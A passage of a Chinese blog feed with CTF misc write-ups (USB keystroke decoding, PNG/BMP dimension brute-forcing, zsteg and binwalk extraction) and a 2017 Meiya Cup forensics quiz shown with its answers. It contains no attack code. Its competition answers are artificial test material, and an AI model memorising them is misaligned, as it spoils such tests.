&quot;&lt;F4&gt;&lt;F4&gt;&quot;, 0x3e: &quot;&lt;F5&gt;&lt;F5&gt;&quot;, 0x3f: &quot;&lt;F6&gt;&lt;F6&gt;&quot;,</span><br><span class="line">    0x40: &quot;&lt;F7&gt;&lt;F7&gt;&quot;, 0x41: &quot;&lt;F8&gt;&lt;F8&gt;&quot;, 0x42: &quot;&lt;F9&gt;&lt;F9&gt;&quot;, 0x43: &quot;&lt;F10&gt;&lt;F10&gt;&quot;,</span><br><span class="line">    0x44: &quot;&lt;F11&gt;&lt;F11&gt;&quot;, 0x45: &quot;&lt;F12&gt;&lt;F12&gt;&quot;</span><br><span class="line">&#125;</span><br><span class="line">data &#x3D; &#39;&#39;</span><br><span class="line">for x in open(&quot;uuu.txt&quot;, &quot;r&quot;).readlines():</span><br><span class="line">    code &#x3D; int(x[4:6], 16) # 有冒号时提取数据的[6:8]，无冒号时数据在[4:6]</span><br><span class="line">    # print(x[4:6])</span><br><span class="line">    if code &#x3D;&#x3D; 0:</span><br><span class="line">        continue</span><br><span class="line">    if code &#x3D;&#x3D; 0x28:</span><br><span class="line">        print(&#39;ENTER!&#39;)</span><br><span class="line">        print(data)</span><br><span class="line">        data &#x3D; &#39;&#39;</span><br><span class="line">        continue</span><br><span class="line">    upper &#x3D; 0</span><br><span class="line">    if int(x[0:2], 16) &#x3D;&#x3D; 0x02 or int(x[0:2], 16) &#x3D;&#x3D; 0x20:</span><br><span class="line">        upper &#x3D; 1</span><br><span class="line">    data +&#x3D; usb_codes[code][upper]</span><br><span class="line">print(data)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上述脚本与常规不同之处在于<strong>0x29: “*”,# <esc></esc></strong>,对0x29进行了处理，暂且用*代替</p><p>为解决题目中模拟vim编辑的情况。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;span id=&quot;data0&quot;&gt;DATA[0]&lt;/span&gt;&lt;/h1&gt;
&lt;hr&gt;
&lt;h3&gt;&lt;span id=&quot;1usb流量分析&quot;&gt;1：USB流量分析&lt;/span&gt;&lt;/h3&gt;
&lt;h4&gt;&lt;span id=&quot;usbkeyboarddatahacker&quot;&gt;UsbKeyboard</summary>
      
    
    
    
    
    <category term="MISC" scheme="http://mklkx.github.io/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>F5杯</title>
    <link href="http://mklkx.github.io/2021/04/24/F5%E6%9D%AF/"/>
    <id>http://mklkx.github.io/2021/04/24/F5%E6%9D%AF/</id>
    <published>2021-04-24T02:24:46.000Z</published>
    <updated>2021-05-04T11:39:52.577Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="ctfshow-f5杯">ctfshow-F5杯</span></h1><hr><h2><span id="1取idatihdr部分重新排列">1：取IDAT,IHDR部分重新排列</span></h2><p>1）IHDR领先</p><p>2）IDAT尝试重新排列</p><p>3）前后补全</p><h3><span id="just-another-拼图">Just Another 拼图</span></h3><blockquote><p>史上最简单的拼图misc题！贴心到连序号都已经全部标注好，令gaps彻底失业、眼科医院纷纷倒闭！唯一的问题是图里好像没有flag？这点小问题应该无关紧要吧。</p><p>感谢@出题人说不要署名 师傅供题。</p><blockquote><p>strings *.jpg | grep IDAT</p></blockquote></blockquote><p><img lazyload src="/images/loading.svg" data-src="1-1.png" alt="1"></p><h2><span id="2数列问题">2：数列问题</span></h2><h3><span id="填字游戏">填字游戏</span></h3><blockquote><p>这什么鬼填字游戏啊，到底要填什么字啊。</p><p>感谢@出题人说这次匿名 师傅供题</p><blockquote><p><a class="link" href="http://oeis.org/">http://oeis.org/<i class="fas fa-external-link-alt"></i></a></p></blockquote></blockquote><p><img lazyload src="/images/loading.svg" data-src="2-1.png" alt="2"></p><p>通过搜索找到对应数字</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">65 69 97 53 121 70 108 52 103</span><br><span class="line"># AEa5yFl4g</span><br></pre></td></tr></table></figure><h2><span id="3">3</span></h2><blockquote><p>两行代码一纸情书</p><blockquote><p>A very simple dll, I promise you can get flag in seconds</p><p>感谢@Y4tacker师傅供题</p></blockquote></blockquote><p>搜索ctf得到一大串字符串</p><p>一把梭后发现base64末尾出现‘==’</p><p>连续解码后得到flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;span id=&quot;ctfshow-f5杯&quot;&gt;ctfshow-F5杯&lt;/span&gt;&lt;/h1&gt;
&lt;hr&gt;
&lt;h2&gt;&lt;span id=&quot;1取idatihdr部分重新排列&quot;&gt;1：取IDAT,IHDR部分重新排列&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;1）IHDR领先&lt;/p&gt;
&lt;p&gt;2）</summary>
      
    
    
    
    
    <category term="challenge" scheme="http://mklkx.github.io/tags/challenge/"/>
    
    <category term="MISC" scheme="http://mklkx.github.io/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>MISC-image-0</title>
    <link href="http://mklkx.github.io/2021/04/21/MISC-image-0/"/>
    <id>http://mklkx.github.io/2021/04/21/MISC-image-0/</id>
    <published>2021-04-21T01:43:15.000Z</published>
    <updated>2021-04-25T13:43:27.673Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="image0">image[0]</span></h1><hr><p>一张图片的百种姿势</p><h2><span id="1bpg">1：bpg</span></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">工具：bpg-0.9.8-win64</span><br><span class="line"></span><br><span class="line">命令：bpgdec -o out.png misc3.bpg</span><br></pre></td></tr></table></figure><h2><span id="2idat块异常">2：IDAT块异常</span></h2><p><img lazyload src="/images/loading.svg" data-src="2-1.png" alt="2-1"></p><p>IDAT未满65524就有下一个数据块了，说明有问题</p><p>delete后得到</p><p><img lazyload src="/images/loading.svg" data-src="2-2.png" alt="2-2"></p><h2><span id="3idat长度转ascii">3：IDAT长度转ASCII</span></h2><h2><span id="4pngdebugger校验crc32">4：pngdebugger校验crc32</span></h2><p>错误的crc-code串联转ascii</p><p>CRC OK!   ===》   1</p><p>CRC FAILED   ===》   0</p><h2><span id="5image爆破长宽">5：image爆破长宽</span></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import struct</span><br><span class="line">import zlib</span><br><span class="line">for i in range(4096):</span><br><span class="line">    for j in range(4096):</span><br><span class="line">        c &#x3D; bytes.fromhex(&#39;4948445200000384000000960802000000&#39;)# IHDR</span><br><span class="line">        ihdr &#x3D; c[:4]+struct.pack(&#39;&gt;i&#39;,i)+struct.pack(&#39;&gt;i&#39;,j)+c[12:]</span><br><span class="line">        crc &#x3D; 0x5255A798# CRC32</span><br><span class="line">        if zlib.crc32(ihdr) &#x3D;&#x3D; crc:</span><br><span class="line">            print(hex(i),hex(j))</span><br><span class="line">            exit(0)</span><br></pre></td></tr></table></figure><p><img lazyload src="/images/loading.svg" data-src="3-1.png" alt="3-1"></p><h2><span id="6png爆破高度">6：png爆破高度</span></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">misc = <span class="built_in">open</span>(<span class="string">&quot;misc26.png&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆破宽</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1024</span>):</span><br><span class="line">    data = misc[<span class="number">12</span>:<span class="number">16</span>] + struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>,i)+ misc[<span class="number">20</span>:<span class="number">29</span>]  <span class="comment">#IHDR数据</span></span><br><span class="line">    crc32 = binascii.crc32(data) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">if</span> crc32 == <span class="number">0xEC9CCBC6</span>: <span class="comment">#IHDR块的crc32值</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;weight&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;hex:&quot;</span>+<span class="built_in">hex</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆破高</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1024</span>):</span><br><span class="line">    data = misc[<span class="number">12</span>:<span class="number">20</span>] + struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>,i)+ misc[<span class="number">24</span>:<span class="number">29</span>]</span><br><span class="line">    crc32 = binascii.crc32(data) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">if</span> crc32 == <span class="number">0xEC9CCBC6</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;height&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;hex:&quot;</span>+<span class="built_in">hex</span>(i))</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line"><span class="comment">#height</span></span><br><span class="line"><span class="comment">#606</span></span><br><span class="line"><span class="comment">#hex:0x25e</span></span><br></pre></td></tr></table></figure><h2><span id="7bmp修改高度">7：bmp修改高度</span></h2><p><img lazyload src="/images/loading.svg" data-src="4-1.png" alt="4-1"></p><p><img lazyload src="/images/loading.svg" data-src="4-2.png" alt="4-2"></p><p>12-15：4字节的biWidth，这里是0x00000280，即十进制的640，用像素表示图像的宽度，查看文件信息验证正确；16-19：4字节的biHeight，这里是0x000001E0，即十进制的480，用像素表示图像的高度，查看文件信息验证正确；同时，这是一个正数，表示图像是倒立的，即图像数据是从左下角到右上角排列的；</p><h2><span id="8jpg修改高度">8：jpg修改高度</span></h2><p><img lazyload src="/images/loading.svg" data-src="5-1.png" alt="5-1"></p><h2><span id="9gif修改高度">9：gif修改高度</span></h2><p><img lazyload src="/images/loading.svg" data-src="6-1.png" alt="6-1"></p><p>后分离帧得到flag</p><h2><span id="10bmp爆破宽度">10：bmp爆破宽度</span></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import struct</span><br><span class="line">import zlib</span><br><span class="line">f &#x3D; open(&#39;misc31.bmp&#39;,&#39;rb&#39;)</span><br><span class="line">c &#x3D; f.read()</span><br><span class="line">width &#x3D; c[18:22]</span><br><span class="line">height &#x3D; c[22:26]</span><br><span class="line"># 爆破bmp宽度</span><br><span class="line">for i in range(900,1100):</span><br><span class="line">    f1 &#x3D; open(str(i)+&#39;.bmp&#39;,&#39;wb&#39;)</span><br><span class="line">    # print(struct.pack(&#39;&gt;i&#39;,i)[::-1])</span><br><span class="line">    img &#x3D; c[:18]+struct.pack(&#39;&gt;i&#39;,i)[::-1]+c[22:]</span><br><span class="line">    f1.write(img)</span><br><span class="line">    f1.close()</span><br></pre></td></tr></table></figure><h2><span id="11png爆破宽度">11：png爆破宽度</span></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import struct</span><br><span class="line">import zlib</span><br><span class="line">#爆破png宽度</span><br><span class="line">f &#x3D; open(r&#39;misc34.png&#39;,&#39;rb&#39;)</span><br><span class="line">c &#x3D; f.read()</span><br><span class="line">width &#x3D; c[16:20]</span><br><span class="line">height &#x3D; c[20:24]</span><br><span class="line">for i in range(900,1200):</span><br><span class="line">    f1 &#x3D; open(str(i)+&#39;.png&#39;,&#39;wb&#39;)</span><br><span class="line">    # print(struct.pack(&#39;&gt;i&#39;,i)[::-1])</span><br><span class="line">    img &#x3D; c[:16]+struct.pack(&#39;&gt;i&#39;,i)+c[20:]</span><br><span class="line">    f1.write(img)</span><br><span class="line">    f1.close()</span><br></pre></td></tr></table></figure><h2><span id="12遇到binwalk有东西但分离不出的情况">12：遇到binwalk有东西，但分离不出的情况</span></h2><p><img lazyload src="/images/loading.svg" data-src="11-1.png" alt="11-1"></p><p>根据binwalk提示，尝试手动分离</p><h2><span id="13zsteg">13：zsteg</span></h2><p>首先尝试binwalk -e</p><p>发现bzip2</p><p><img lazyload src="/images/loading.svg" data-src="12-1.png" alt="12-1"></p><p>进一步binwalk却始终存在问题</p><hr><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zsteg misc17.png</span><br></pre></td></tr></table></figure><p>得到应该分离的数据段</p><p><img lazyload src="/images/loading.svg" data-src="12-2.png" alt="12-2"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zsteg -e &quot;extradata:0&quot; &#x2F;root&#x2F;桌面&#x2F;misc17.png &gt; 1.txt</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">binwalk -e 1.txt</span><br></pre></td></tr></table></figure><h2><span id="14exiftool查看附加信息">14：exiftool查看附加信息</span></h2><h2><span id="15gif考虑时间间隔3637gtgt01">15：gif考虑时间间隔/3637&gt;&gt;01</span></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">identify -format &quot;%T&quot; misc39.gif &gt; 1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#coding&#x3D;utf-8</span><br><span class="line">text&#x3D;&#39;737363636373737373736373636373736363737363737373636373737373637363636373736373737373737373637373737373737363737363737363736373637373636373636373737363636363737363636373637373636373637373636373736373736363737363637373736363736373737363637363737363736373737363637373637373636363736363737363737373737363636373637373636373637363737363637363637373637373636373737363636373736363736363637373736363736373736373736363737363637373737363636363736373737363637373736363736373737363636373637373636363737373736363636373637373636363636373736373636363737363736373637373736363737373737373637&#39;.split(&#39;3&#39;)</span><br><span class="line">print(text)</span><br><span class="line">firstType &#x3D; &#39;6&#39;</span><br><span class="line">secondType &#x3D; &#39;7&#39;</span><br><span class="line">binaryString &#x3D; &#39;&#39;</span><br><span class="line"></span><br><span class="line">for char in text: #Foreach char</span><br><span class="line">    if char &#x3D;&#x3D; firstType: #Check if it is the first type</span><br><span class="line">        binaryString +&#x3D; &#39;0&#39; #Mark it as 0</span><br><span class="line">        # print(char)</span><br><span class="line">    else:</span><br><span class="line">        binaryString +&#x3D; &#39;1&#39; #Mark it as 1</span><br><span class="line">        # print(char)</span><br><span class="line"></span><br><span class="line">print(binaryString) #Print result</span><br><span class="line">print((len(binaryString)-1)&#x2F;7)</span><br><span class="line"></span><br><span class="line">binary&#x3D;&#39;&#39;</span><br><span class="line">for i in range(41):</span><br><span class="line">    binary +&#x3D; binaryString[7*i:7*i+7] + &#39; &#39;</span><br><span class="line">print(binary)</span><br><span class="line">#1100011 1110100 1100110 1110011 1101000 1101111 1110111 1111011 0110101 0110010 0111000 0110001 0110010 1100110 1100110 0111001 0111001 0110101 1100110 1100010 0110111 1100010 1100101 0110010 0110110 0111000 1100100 0111001 0110110 0110011 1100001 0111001 1100101 1100010 1100011 1100001 0110000 0110100 0110101 0111001 1111101 </span><br></pre></td></tr></table></figure><h2><span id="16lsb改变通道改变排序方式">16：LSB改变通道，改变排序方式</span></h2><h2><span id="17base">17：base</span></h2><h2><span id="18取idatihdr部分重新排列">18：取IDAT,IHDR部分重新排列</span></h2><p>1）IHDR领先</p><p>2）IDAT尝试重新排列</p><p>3）前后补全</p><p>&lt;F5杯《Just Another 拼图》&gt;</p><h1><span id="脑洞部分">脑洞部分</span></h1><h2><span id="1010按位取">1：010按位取</span></h2><p><img lazyload src="/images/loading.svg" data-src="1-1.png" alt="1-1"></p><h2><span id="2所有头的hex都该熟悉各种hex魔转">2：所有头的hex都该熟悉,各种hex魔转</span></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Serial Number                   : 686578285826597329</span><br></pre></td></tr></table></figure><p>686578285826597329=》hex(X&amp;Ys)</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">X Resolution                    : 3902939465</span><br><span class="line">Y Resolution                    : 2371618619</span><br><span class="line">X Position                      : 1082452817</span><br><span class="line">Y Position                      : 2980145261</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; print(hex(x))</span><br><span class="line">0xe8a22149</span><br><span class="line">&gt;&gt;&gt; print(hex(y))</span><br><span class="line">0x8d5c073b</span><br><span class="line">&gt;&gt;&gt; print(hex(a))</span><br><span class="line">0x4084eb51</span><br><span class="line">&gt;&gt;&gt; print(hex(b))</span><br><span class="line">0xb1a1686d</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;span id=&quot;image0&quot;&gt;image[0]&lt;/span&gt;&lt;/h1&gt;
&lt;hr&gt;
&lt;p&gt;一张图片的百种姿势&lt;/p&gt;
&lt;h2&gt;&lt;span id=&quot;1bpg&quot;&gt;1：bpg&lt;/span&gt;&lt;/h2&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;tabl</summary>
      
    
    
    
    
    <category term="MISC" scheme="http://mklkx.github.io/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>2017年第三届美亚杯电子取证-个人赛WP</title>
    <link href="http://mklkx.github.io/2021/04/15/2017%E5%B9%B4%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%BE%8E%E4%BA%9A%E6%9D%AF%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/"/>
    <id>http://mklkx.github.io/2021/04/15/2017%E5%B9%B4%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%BE%8E%E4%BA%9A%E6%9D%AF%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/</id>
    <published>2021-04-15T06:56:37.000Z</published>
    <updated>2021-05-04T11:39:45.699Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="2017年第三届美亚杯电子取证-个人赛">2017年第三届美亚杯电子取证-个人赛</span></h3><hr><h4><span id="案件背景">案件背景</span></h4><blockquote><p>Gary是一位经常用手提电脑的人，而且热爱足球运动，常常看足球网站。他于2007年9月开始想赚快钱，思想变得偏激，并关注一些违法的事。于是Gary就想着赌博，查阅军事资料，了解恐怖袭击的新闻报道。另外他开始上网寻找有关如何购买枪械、刀等武器的资料，还寻找如何制造假网站，但最后均无收获。</p><p>检材：</p><p>.e01镜像</p><p>工具软件：</p><p>取证大师V6.1.67374RTM（FMP）</p></blockquote><h4><span id="1求镜像的md5哈希值">1：求镜像的MD5哈希值</span></h4><table><thead><tr><th>1</th><th>Gary的笔记本电脑已成功取证并制作成镜像 (Forensic Image)，下列哪个是其MD5哈希值。</th></tr></thead><tbody><tr><td><strong>A.</strong></td><td><strong>0CFB3A0BB016165F1BDEB87EE9F710C9</strong></td></tr><tr><td>B.</td><td>5F1BDEB87EE9F710C90CFB3A0BB01616</td></tr><tr><td>C.</td><td>A0BB016160CFB3A0BB0161661670CFB3</td></tr><tr><td>D.</td><td>16160CFB3A0BB016166A0BB016166167</td></tr><tr><td>E.</td><td>FB3A0BB016165 B016166 A0DF7FJE2EJ0</td></tr></tbody></table><p>证据文件-》选中镜像-》摘要-》查看md5值</p><p><img lazyload src="/images/loading.svg" data-src="1-1.png" alt="1-1"></p><h4><span id="2求硬盘分区">2：求硬盘分区</span></h4><table><thead><tr><th>2</th><th>根据此镜像 (Forensic Image)，里面有多少个硬盘分区？</th></tr></thead><tbody><tr><td>A.</td><td>1</td></tr><tr><td>B.</td><td>2</td></tr><tr><td><strong>C.</strong></td><td><strong>3</strong></td></tr><tr><td>D.</td><td>4</td></tr><tr><td>E.</td><td>5</td></tr></tbody></table><p><img lazyload src="/images/loading.svg" data-src="2-1.png" alt="2-1"></p><p>C盘D盘E盘</p><h4><span id="3开始逻辑区块地址lba">3：开始逻辑区块地址（LBA）</span></h4><table><thead><tr><th>3</th><th>你能找到硬盘操作系统分区内的开始逻辑区块地址（LBA）？</th></tr></thead><tbody><tr><td>A.</td><td>0</td></tr><tr><td>B.</td><td>512</td></tr><tr><td>C.</td><td>2,048</td></tr><tr><td><strong>D.</strong></td><td><strong>206,848</strong></td></tr><tr><td>E.</td><td>102,402,047</td></tr></tbody></table><p><img lazyload src="/images/loading.svg" data-src="3-1.png" alt="3-1"></p><p>其中，C盘的设备描述为系统保留；D盘E盘为本地磁盘。</p><p><img lazyload src="/images/loading.svg" data-src="3-2.png" alt="3-2"></p><p>结合磁盘内容，找到D盘的物理位置105,906,176</p><p>因为”现今计算机上所谓一个逻辑区块通常是512或1024位组“</p><p>将105,906,176/512=206，848</p><p><strong><u>物理扇区，在winhex中就是$boot就是DBR</u></strong></p><h4><span id="4硬盘操作系统分区的大小">4：硬盘操作系统分区的大小</span></h4><table><thead><tr><th>4</th><th>你能找到硬盘操作系统分区的大小吗 (字节byte)？</th></tr></thead><tbody><tr><td>A.</td><td>48.7</td></tr><tr><td>B.</td><td>102,195,200</td></tr><tr><td>C.</td><td>140,232,703</td></tr><tr><td>D.</td><td>19,369,295,872</td></tr><tr><td><strong>E.</strong></td><td><strong>52,323,942,400</strong></td></tr></tbody></table><p><img lazyload src="/images/loading.svg" data-src="4-1.png" alt="4-1"></p><p>48.73*1024*1024*1024=52,323,439,083.52</p><h4><span id="5mft的物理起始偏移位置">5：$MFT的物理起始偏移位置</span></h4><table><thead><tr><th>5</th><th>在包含操作系统的分区内，$MFT的物理起始偏移位置是什么？</th></tr></thead><tbody><tr><td>A.</td><td>3328</td></tr><tr><td>B.</td><td>4,170,040</td></tr><tr><td>C.</td><td>6,026,176</td></tr><tr><td><strong>D.</strong></td><td><strong>6,498,304</strong></td></tr><tr><td>E.</td><td>16,949,352</td></tr></tbody></table><p><img lazyload src="/images/loading.svg" data-src="5-1.png" alt="5-1"></p><p><strong><u>正常情况MFT以元文件的形式存储在相应磁盘分区的根目录中，但是是隐藏的。FMP可以直接访问到该文件。</u></strong></p><p><img lazyload src="/images/loading.svg" data-src="5-2.png" alt="5-2"></p><p>3,327,131,648/512=6,498,304</p><h4><span id="6操作系统的安装日期">6：操作系统的安装日期</span></h4><table><thead><tr><th>6</th><th>请找出系统文件“SOFTWARE＂，请问操作系统的安装日期是？   （答案格式 －“世界协调时间＂：YYYY-MM-DD HH:MM UTC）</th></tr></thead><tbody><tr><td>A.</td><td>2017-09-04 10:10 UTC</td></tr><tr><td><strong>B.</strong></td><td><strong>2017-09-04 10:11 UTC</strong></td></tr><tr><td>C.</td><td>2017-09-04 10:12 UTC</td></tr><tr><td>D.</td><td>2017-09-04 10:13 UTC</td></tr><tr><td>E.</td><td>2017-09-14 02:14 UTC</td></tr></tbody></table><p>取证结果-》系统痕迹-》系统信息-》安装时间</p><p><img lazyload src="/images/loading.svg" data-src="6-1.png" alt="6-1"></p><p>2017-09-04 18:11:10</p><p>调整了时区后得到答案B</p><p>此处除了常识性的“-8”之外，遇到时区问题可以在此处验证调整</p><p><img lazyload src="/images/loading.svg" data-src="6-2.png" alt="6-2"></p><h4><span id="7sid">7：SID</span></h4><p><u><strong>SID为用户标识 （Security Identifiers）标识用户、组和计算机帐户的唯一的号码。</strong></u></p><table><thead><tr><th>7</th><th>用户“Gary＂的SID是什么？</th></tr></thead><tbody><tr><td><strong>A.</strong></td><td><strong>1000</strong></td></tr><tr><td>B.</td><td>1001</td></tr><tr><td>C.</td><td>1002</td></tr><tr><td>D.</td><td>1005</td></tr><tr><td>E.</td><td>1007</td></tr></tbody></table><p><img lazyload src="/images/loading.svg" data-src="7-1.png" alt="7-1"></p><h4><span id="8做法同上">8：做法同上</span></h4><table><thead><tr><th>8</th><th>用户“彼得＂的SID是什么？</th></tr></thead><tbody><tr><td>A.</td><td>1000</td></tr><tr><td><strong>B.</strong></td><td><strong>1001</strong></td></tr><tr><td>C.</td><td>1002</td></tr><tr><td>D.</td><td>1005</td></tr><tr><td>E.</td><td>1007</td></tr></tbody></table><h4><span id="9操作系统">9：操作系统</span></h4><table><thead><tr><th>9</th><th>硬盘的操作系统是什么？</th></tr></thead><tbody><tr><td><strong>A.</strong></td><td><strong>Windows 7</strong></td></tr><tr><td>B.</td><td>Windows 8</td></tr><tr><td>C.</td><td>Windows 10</td></tr><tr><td>D.</td><td>Linux Red Hat 7.1</td></tr><tr><td>E.</td><td>MAC OS X</td></tr></tbody></table><p><img lazyload src="/images/loading.svg" data-src="9-1.png" alt="9-1"></p><h4><span id="10查看默认浏览器">10：查看默认浏览器</span></h4><table><thead><tr><th>10</th><th>哪个是Windows的默认浏览器？</th></tr></thead><tbody><tr><td><strong>A.</strong></td><td><strong>Microsoft Internet Explorer</strong></td></tr><tr><td>B.</td><td>Google Chrome</td></tr><tr><td>C.</td><td>Mozilla Firefox</td></tr><tr><td>D.</td><td>Opera</td></tr><tr><td>E.</td><td>QQ 浏览器</td></tr></tbody></table><p>取证后看到只有IE、Chrome和火狐，</p><p><img lazyload src="/images/loading.svg" data-src="10-1.png" alt="10-1"></p><p>根据常识可知IE为默认浏览器</p><h4><span id="11辨别url">11：辨别URL</span></h4><table><thead><tr><th>11</th><th>用户 “Gary＂曾经浏览过一些非法博彩网站，下列哪项URL符合？</th></tr></thead><tbody><tr><td>a.</td><td><a class="link" href="http://www.10086.com">www.10086.com<i class="fas fa-external-link-alt"></i></a></td></tr><tr><td><strong>b.</strong></td><td><strong><a class="link" href="http://www.188bet.com">www.188bet.com<i class="fas fa-external-link-alt"></i></a></strong></td></tr><tr><td><strong>c.</strong></td><td><strong><a class="link" href="http://www.hv5858.com">www.hv5858.com<i class="fas fa-external-link-alt"></i></a></strong></td></tr><tr><td>d.</td><td><a class="link" href="http://www.12377.cn">www.12377.cn<i class="fas fa-external-link-alt"></i></a></td></tr><tr><td><strong>e.</strong></td><td><strong><a class="link" href="http://www.88.bettingwell.com">www.88.bettingwell.com<i class="fas fa-external-link-alt"></i></a></strong></td></tr><tr><td>f.</td><td><a class="link" href="http://www.aaakk.org">www.aaakk.org<i class="fas fa-external-link-alt"></i></a></td></tr><tr><td></td><td></td></tr><tr><td>A.</td><td>只有(a)  &amp; (b)</td></tr><tr><td>B.</td><td>(a), (b), (d) &amp; (f)</td></tr><tr><td>C.</td><td>(b), ©, (d) &amp; (f)</td></tr><tr><td>D.</td><td>(b),  ©, (e) &amp; (f)</td></tr><tr><td>E.</td><td>以上皆是</td></tr></tbody></table><p>通过实时搜索，</p><p>a:</p><p>无此记录</p><p>b:</p><p><img lazyload src="/images/loading.svg" data-src="11-1.png" alt="11-1"></p><p>根据标题判断为非法博彩网站</p><p>c:</p><p><img lazyload src="/images/loading.svg" data-src="11-2.png" alt="11-2"></p><p>d:</p><p><img lazyload src="/images/loading.svg" data-src="11-3.png" alt="11-3"></p><p>中国互联网举报中心</p><p>e:</p><p>在线博彩公司</p><p>f:</p><p>无此结果</p><p>PS：此处f项的结果笔者存在疑义，但结合选项选D</p><h4><span id="12登入名称">12：登入名称</span></h4><table><thead><tr><th>12</th><th>用户Gary曾经登入上述非法博彩网站，下列哪个是其登入名称？</th></tr></thead><tbody><tr><td>A.</td><td>ggchey68</td></tr><tr><td>B.</td><td>gany-cher88</td></tr><tr><td>C.</td><td>galy_chen88</td></tr><tr><td>D.</td><td>garychen1688</td></tr><tr><td><strong>E.</strong></td><td><strong>garychen88</strong></td></tr></tbody></table><p>结合第11题，发现上网记录的登陆信息里</p><p>访问www.188bet.com的[garychen88]</p><p><img lazyload src="/images/loading.svg" data-src="12-1.png" alt="12-1"></p><h4><span id="13邮箱">13：邮箱</span></h4><table><thead><tr><th>13</th><th>在所有用户中，用于电子邮件发送/接收的程序名称是什么？</th></tr></thead><tbody><tr><td>A.</td><td>新浪邮箱</td></tr><tr><td>B.</td><td>网易163</td></tr><tr><td>C.</td><td>阿里邮箱</td></tr><tr><td>D.</td><td>Foxmail</td></tr><tr><td><strong>E.</strong></td><td><strong>Mozilla Mail – ThunderBird</strong></td></tr></tbody></table><p>取证结果-》邮件解析</p><p><img lazyload src="/images/loading.svg" data-src="13-1.png" alt="13-1"></p><h4><span id="14usb使用痕迹">14：USB使用痕迹</span></h4><table><thead><tr><th>14</th><th>在该Windows系统中，曾经连接数个USB移动储存装置 (U盘)，下列那个不是  该系统连接过的USB移动储存装置 ?</th><th></th></tr></thead><tbody><tr><td><strong>A.</strong></td><td><strong>WD My Passport 0827  USB Device</strong></td><td></td></tr><tr><td>B.</td><td>StoreJet Transcend USB Device</td><td></td></tr><tr><td>C.</td><td>Samsung Portable  SSD USB Device</td><td></td></tr><tr><td>D.</td><td>StoreJet  TS256GESD400K USB Device</td><td></td></tr><tr><td>E.</td><td>General UDisk USB Device</td><td></td></tr></tbody></table><p>取证结果-》USB设备使用痕迹</p><p><img lazyload src="/images/loading.svg" data-src="14-1.png" alt="14-1"></p><h4><span id="15做法同上">15：做法同上</span></h4><table><thead><tr><th>15</th><th>在该Windows系统中，下列哪个USB移动储存装置 (U盘)曾被指派为‘Z’磁盘分区代号(Drive Letter) ?</th></tr></thead><tbody><tr><td>A.</td><td>WD My Passport 0827  USB Device</td></tr><tr><td>B.</td><td>StoreJet Transcend USB Device</td></tr><tr><td>C.</td><td>Samsung Portable  SSD USB Device</td></tr><tr><td>D.</td><td>StoreJet  TS256GESD400K USB Device</td></tr><tr><td><strong>E.</strong></td><td><strong>General UDisk USB Device</strong></td></tr></tbody></table><p><img lazyload src="/images/loading.svg" data-src="15-1.png" alt="15-1"></p><h4><span id="16最后关机时间">16：最后关机时间</span></h4><table><thead><tr><th>16</th><th>该Windows系统中，下列哪个是最后的关机时间?</th></tr></thead><tbody><tr><td><strong>A.</strong></td><td><strong>2017-10-31  4:52:54 UTC</strong></td></tr><tr><td>B.</td><td>2017-10-31  4:53:54 UTC</td></tr><tr><td>C.</td><td>2017-10-31  4:54:54 UTC</td></tr><tr><td>D.</td><td>2017-10-31  4:55:54 